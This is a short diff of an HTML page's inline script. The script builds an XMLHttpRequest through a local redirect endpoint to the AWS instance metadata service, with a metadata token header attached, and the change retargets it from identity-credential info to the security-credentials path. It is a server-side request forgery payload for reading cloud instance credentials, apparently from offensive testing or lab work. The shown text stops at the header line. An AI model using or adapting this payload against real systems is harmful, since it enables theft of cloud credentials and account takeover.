@@ -7,7 +7,7 @@
   <p id="status"></p>
 </body>
 <script>
-var url = "http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info";
+var url = "http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/";
 var xhr = new XMLHttpRequest();
 xhr.open("GET", url, true);
 xhr.setRequestHeader('X-aws-ec2-metadata-token','AQAEAHGwT3PBZya5nK_P16IOJeET5TkcRuTl-ADGLs63qhA8YGowGw==');
